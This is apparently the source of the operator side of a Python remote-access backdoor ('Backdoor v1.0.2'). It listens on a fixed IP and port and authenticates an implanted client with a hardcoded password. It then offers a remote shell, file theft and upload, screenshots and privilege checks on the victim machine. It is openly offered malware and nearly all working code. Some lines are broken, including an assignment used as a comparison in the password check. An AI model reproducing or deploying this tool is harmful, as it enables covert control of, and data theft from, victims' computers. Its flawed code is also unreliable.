# netstat -an | findstr 57575 | findstr TCP | findstr LISTENING
# ipconfig /all | findstr /I ipv4
# Testet in: Python 3.8.8
# By: LawlietJH
# Backdoor v1.0.2

import atexit
import socket
import base64
import sys
import os

#=======================================================================
#=======================================================================
#=======================================================================

class Server:
	
	def __init__(self, LHOST, LPORT, download_path='downloads/', upload_path='uploads/', sc_path='screenshots/'):
		
		self.current_dir = None
		self.server = None
		self.client = None
		self.IP     = None
		self.LHOST  = LHOST
		self.LPORT  = LPORT
		self.LOCAL  = (self.LHOST, self.LPORT)
		self.sc_count = 0
		self.passwd = 'Z10N'
		self.connect = False
		# ~ self.fs_encoding = sys.getfilesystemencoding()
		
		if not download_path.endswith('/'): download_path+='/'
		if not upload_path.endswith('/'):   upload_path+='/'
		if not sc_path.endswith('/'):       sc_path+='/'
		self.download_path = download_path
		self.upload_path   = upload_path
		self.sc_path       = sc_path
	
	def command_list(self):
		
		self.EXIT = ('exit', 'close', 'break', 'stop', 'return')
		self.CLS  = ('cls', 'clear')
		self.DOWNLOAD = ('download', 'dl')
		self.UPLOAD   = ('upload', 'ul')
		self.IS_ADMIN = ('isadmin', 'isuseranadmin', 'amianadmin','privileges')
	
	def latin1_encoding(self, res):
		
		res = res.decode('latin1')
		
		res = res.replace('·','À')
		res = res.replace('ú','·')
		res = res.replace('¨','¿')
		res = res.replace('ù','¨')
		res = res.replace('ï','´')
		res = res.replace('­','¡')
		res = res.replace('§','º')
		res = res.replace('ª','¬')
		res = res.replace('¦','ª')
		res = res.replace('ì','ý')
		res = res.replace('','ÿ')
		
		res = res.replace('','ù')
		res = res.replace('£','ú')
		res = res.replace('','ü')
		res = res.replace('ë','Ù')
		res = res.replace('é','Ú')
		res = res.replace('','Ü')
		
		res = res.replace('','è')
		res = res.replace('','é')
		res = res.replace('','ë')
		res = res.replace('Ô','È')
		res = res.replace('','É')
		res = res.replace('Ó','Ë')
		
		res = res.replace('','ì')
		res = res.replace('¡','í')
		res = res.replace('','ï')
		res = res.replace('Þ','Ì')
		res = res.replace('Ö','Í')
		res = res.replace('Ø','Ï')
		
		res = res.replace('¶','Â')
		res = res.replace('Ò','Ê')
		res = res.replace('×','Î')
		res = res.replace('â','Ô')
		res = res.replace('ê','Û')
		
		res = res.replace('','ò')
		res = res.replace('¢','ó')
		res = res.replace('','ö')
		res = res.replace('ã','Ò')
		res = res.replace('à','Ó')
		res = res.replace('','Ö')
		
		res = res.replace('Ç','Ã')
		res = res.replace('å','Õ')
		res = res.replace('Æ','ã')
		res = res.replace('ä','õ')
		
		res = res.replace('','à')
		res = res.replace(' ','á')
		res = res.replace('','ä')
		res = res.replace('µ','Á')
		res = res.replace('','Ä')
		
		res = res.replace('','â')
		res = res.replace('','ê')
		res = res.replace('','î')
		res = res.replace('','ô')
		res = res.replace('','û')
		
		res = res.replace('¥','Ñ')
		res = res.replace('¤','ñ')
		
		res = res.replace('','ç')
		res = res.replace('','Ç')
		
		return res
					
	
	def get_chunks(self, data, bfc=2**16):	# 2^16 = 65536 bytes = 64 kb, bfc = bytes for chunk
		
		parts = (len(data) // bfc)
		parts += 1 if (len(data) % bfc) else 0
		chunks = [ data[bfc*i:bfc*(i+1)] for i in range(parts) ]
		return chunks
	
	def chk_download_path(self):
		if self.download_path:
			if not os.path.isdir(self.download_path):
				os.mkdir(self.download_path)
		else:
			self.download_path = 'downloads/'
			if not os.path.isdir(self.download_path):
				os.mkdir(self.download_path)
	
	def chk_upload_path(self):
		if self.upload_path:
			if not os.path.isdir(self.upload_path):
				os.mkdir(self.upload_path)
		else:
			self.upload_path = 'uploads/'
			if not os.path.isdir(self.upload_path):
				os.mkdir(self.upload_path)
	
	def chk_sc_path(self):
		if self.sc_path:
			if not os.path.isdir(self.sc_path):
				os.mkdir(self.sc_path)
		else:
			self.sc_path = 'screenshots/'
			if not os.path.isdir(self.sc_path):
				os.mkdir(self.sc_path)
	
	def progress_bar(self, pos, chunks, qty=30, c=('█',' '), bfc=2**16): # bfc = bytes for chunk
		
		block = 100 / qty
		chunk = 100 / chunks
		
		percent  = chunk * pos
		progress = percent // block
		progress += 1 if percent % block > 0 else 0
		spaces   = qty - progress
		# ~ if pos == chunks: percent = 100
		bar = '{}% |{}{}|'.format(str(int(percent)).rjust(3),c[0]*int(progress), c[1]*int(spaces))
		
		return bar
	
	def shell(self):
		
		self.command_list()
		self.current_dir = self.client.recv(1024).decode()
		
		while True:
			
			try:
				self.client.send('alive'.encode())
				self.client.recv(16)
			except ConnectionAbortedError:
				sys.exit()
			
			try:
				command = input('{}~#: '.format(self.current_dir))
			except KeyboardInterrupt:
				print()
				command = 'exit'
			
			command = command.strip()
			
			#===========================================================
			# Commands:
			
			if command.lower() in self.EXIT:
				self.client.send(self.EXIT[0].encode())
				print('\n [+] Cerrando Conexion...')
				break
			elif command.lower().startswith('cd'):
				if len(command) >= 2:
					self.client.send(command.encode())
					resp = self.client.recv(1024)
					if command.lower() == 'cd':
						resp = self.latin1_encoding(resp)
						print(resp)
					else:
						resp = resp.decode('utf-8', 'ignore')
						if resp.startswith('No existe la ruta:'):
							print(resp)
						else:
							self.current_dir = resp
			elif command.lower().startswith(self.DOWNLOAD):
				if not (command.lower() == 'dl' and len(command.lower()) > 2) \
				or not (command.lower() == 'download' and len(command.lower()) > 8):
					print('\n Use: download FILE\n')
				else:
					self.chk_download_path()
					self.client.send(command.encode())
					res = self.client.recv(1024).decode('utf-8', 'ignore')
					if res == 'file does not exist':
						print('\n    Ese archivo no existe!\n')
					else:
						self.client.send('ok'.encode())
						file_name = command[len(self.DOWNLOAD):].strip()
						chunks = self.client.recv(1024).decode('utf-8', 'ignore')
						chunks = int(chunks.replace('Chunks: ',''))
						self.client.send('ok'.encode())
						data = ''.encode()
						print('')
						for i in range(chunks):
							chunk = self.client.recv(2**16)
							data += chunk
							bar = self.progress_bar(i+1, chunks)
							print('\r [+] Downloading: '+bar, end='')
							self.client.send('ok'.encode())
						with open(self.download_path+file_name, 'wb') as file_:
							file_.write(base64.b64decode(data))
							file_.close()
						print('\n\n  Descarga Completada! Archivo: '+file_name+'\n')
			elif command.lower().startswith(self.UPLOAD):
				self.chk_upload_path()
				file_name = command[6:].strip()
				if not os.path.isfile(self.upload_path+file_name):
					print('\n    No existe el Archivo \'{}\' en la carpeta Uploads!\n'.format(file_name))
				else:
					self.client.send(command.encode())
					self.client.recv(1024)
					with open(self.upload_path+file_name, 'rb') as file_:
						data = base64.b64encode(file_.read())
						chunks = self.get_chunks(data)
						chunks_len = len(chunks)
						info = 'Chunks: '+str(chunks_len)
						self.client.send(info.encode())
						self.client.recv(1024)
						print('')
						for i, chunk in enumerate(chunks):
							self.client.send(chunk)
							self.client.recv(1024)
							bar = self.progress_bar(i+1, chunks_len)
							print('\r [+] Uploading: '+bar, end='')
						print('\n\n  Subida Completada! Archivo: '+file_name+'\n')
						file_.close()
			elif command.lower().startswith('getweb'):
				self.client.send(command.encode())
				res = self.client.recv(1024).decode('utf-8', 'ignore')
				print(res)
			elif command.lower().startswith('showme'):
				print()
				if command[7:].lower() in ['', '/a', '/all', '-a', '--all', 'all']: 
					
					files = os.listdir(self.download_path)
					print(' Downloads.\n Archivos en Total: '+str(len(files))+'\n')
					for f in files: print(' [↓] '+f)
					print(' ________________________________\n')
					files = os.listdir(self.upload_path)
					print(' Uploads.\n Archivos en Total: '+str(len(files))+'\n')
					for f in files: print(' [↑] '+f)
					print(' ________________________________\n')
					files = os.listdir(self.sc_path)
					print(' Screenshots.\n Archivos en Total: '+str(len(files))+'\n')
				else:
					if command[7:].lower() in ['downloads','download','down','d','-d','--down','--download','--downloads','/d','/down','download','/downloads']:
						files = os.listdir(self.download_path)
						print(' Downloads.\n Archivos en Total: '+str(len(files))+'\n')
						for f in files: print(' [↓] '+f)
					elif command[7:].lower() in ['uploads','upload','up','u','-u','--up','--upload','--uploads','/u','/up','upload','/uploads']:
						files = os.listdir(self.upload_path)
						print(' Uploads.\n Archivos en Total: '+str(len(files))+'\n')
						for f in files: print(' [↑] '+f)
					elif command[7:].lower() in ['sc','screen','screenshot','screenshots']:
						files = os.listdir(self.sc_path)
						print(' Screenshots.\n Archivos en Total: '+str(len(files))+'\n')
					else:
						print('Comando desconocido...\n')
						continue
				print()
			elif command.lower().startswith('screenshot'):
				self.chk_sc_path()
				self.client.send(command.encode())
				res = self.client.recv(1024).decode()
				if res == 'Error':
					print('No se pudo tomar la captura de pantalla.')
					continue
				else:
					self.client.send('Ok'.encode())
				chunks = self.client.recv(1024).decode('utf-8', 'ignore')
				chunks = int(chunks.replace('Chunks: ',''))
				self.client.send('ok'.encode())
				data = ''.encode()
				print('')
				for i in range(chunks):
					chunk = self.client.recv(2**16)
					data += chunk
					bar = self.progress_bar(i+1, chunks)
					print('\r [+] Downloading: '+bar, end='')
					self.client.send('ok'.encode())
				file_name = 'sc_{}.png'.format(str(self.sc_count).zfill(3))
				while os.path.isfile(self.sc_path+file_name):
					self.sc_count += 1
					file_name = 'sc_{}.png'.format(str(self.sc_count).zfill(3))
				with open(self.sc_path+file_name, 'wb') as file_:
					file_.write(base64.b64decode(data))
					file_.close()
				print('\n\n  Descarga Completada! Screenshot: '+file_name+'\n')
				self.sc_count += 1
			elif command.lower() in self.CLS:
				os.system('cls')
				print()
				self.client.send('cls'.encode())
				self.client.recv(2)
			elif command.lower().startswith('activetime'):
				self.client.send(command.encode())
				res = self.client.recv(1024).decode('utf-8', 'ignore')
				print('\n [+] Tiempo total activo del sistema: ' + res + '\n')
			elif command.lower() in self.IS_ADMIN:
				self.client.send(self.IS_ADMIN[0].encode())
				res = self.client.recv(1024).decode('utf-8', 'ignore')
				if res == 'ok':
					print('\n [+] Tienes permisos de administrador\n')
				else:
					print('\n [-] NO tienes permisos de administrador\n')
			elif not command: pass
			else:
				self.client.send(command.encode())
				res = self.client.recv(2**16)
				res = self.latin1_encoding(res)
				if res == 'None':
					if command.startswith('mkdir'):
						print('\n    Carpeta \'{}\' creada con éxito.\n'.format(command[5:].strip()))
				else:
					print(res)
			
			#===========================================================
	
	def up(self):
		
		self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		
		try: self.server.bind(self.LOCAL)
		except OSError:
			print('\n No se puede conectar con la dirección IP: '+str(self.LHOST))
			sys.exit()
		
		self.server.listen(1)
		
		print('\n [~] Corriendo servidor y esperando conexión...')
		
		self.client, self.IP = self.server.accept()
		
		print('\n [+] Conexión recibida de:', self.IP[0], '\n')
		print('\n [+] Validando conexión:', end=' ')
		
		if self.client.recv(64) = self.passwd:
			self.client.send('ok'.encode())
			self.connect = True
		else:
			self.client.send('error'.encode())



@atexit.register
def close():
	if server.client:
		try:
			server.client.send(server.EXIT[0].encode())
		except ConnectionAbortedError:
			print(' [-] Se ha anulado la conexión establecida por el software en su equipo host.')



if __name__ == '__main__':
	
	LHOST = '192.168.1.69'
	LPORT = 57575
	
	server = Server(LHOST, LPORT)
	server.up()
	if server.connect: server.shell()
	server.server.close()


